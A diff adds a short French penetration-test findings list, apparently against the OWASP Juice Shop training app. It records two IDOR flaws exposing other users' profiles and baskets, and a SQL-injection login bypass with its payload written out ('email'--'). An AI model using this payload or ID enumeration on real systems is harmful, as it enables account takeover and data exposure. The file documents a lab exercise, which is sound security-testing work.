@@ -1,0 +1,16 @@
+=== VULNÉRABILITÉS IDOR CONFIRMÉES ===
+
+VULN-IDOR-01 : Lecture profils utilisateurs
+  Endpoint : GET /api/Users/{id}
+  Impact   : N'importe quel user authentifié lit le profil de tous les users
+  Preuve   : Bender (id=3) lit admin (id=1), jim (id=2), etc. → HTTP 200
+
+VULN-IDOR-02 : Lecture paniers utilisateurs
+  Endpoint : GET /rest/basket/{id}
+  Impact   : Bender accède aux paniers 1-5 → HTTP 200 sur tous
+  Preuve   : Basket 1 (admin) = 3 produits visibles
+
+VULN-SQLi-LOGIN : Bypass authentification
+  Endpoint : POST /rest/user/login
+  Payload  : email = "bender@juice-sh.op'--"
+  Impact   : Contournement du mot de passe sur tout compte connu
